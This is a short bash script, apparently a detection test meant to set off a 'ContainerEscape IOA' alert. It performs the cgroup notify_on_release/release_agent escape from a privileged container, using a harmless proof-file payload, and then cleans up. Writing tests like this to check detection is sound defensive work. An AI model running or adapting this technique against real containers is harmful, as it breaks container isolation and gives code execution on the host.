#!/bin/bash
# 01 - Container Escape via cgroup notify_on_release
# Trigger: ContainerEscape IOA
# Tactic: Privilege Escalation / Escape to Host
# Requires: --privileged
set -e
echo "=== [01] Container Escape (cgroup notify_on_release) ==="

mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || true

# Create a child cgroup
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release 2>/dev/null || true

# Set release_agent (will fail gracefully if not privileged enough)
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab 2>/dev/null || echo "/")
echo "$host_path/cmd" > /tmp/cgrp/release_agent 2>/dev/null || true

# Trigger (write a PID then remove it)
echo '#!/bin/sh' > /cmd 2>/dev/null || true
echo "echo container-escape-test > /tmp/escape_proof" >> /cmd 2>/dev/null || true
chmod a+x /cmd 2>/dev/null || true

# Add and immediately remove a process to trigger release
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 2>/dev/null || true

# Cleanup
umount /tmp/cgrp 2>/dev/null || true
rm -rf /tmp/cgrp /cmd 2>/dev/null || true

echo "[01] Done — ContainerEscape IOA should trigger"
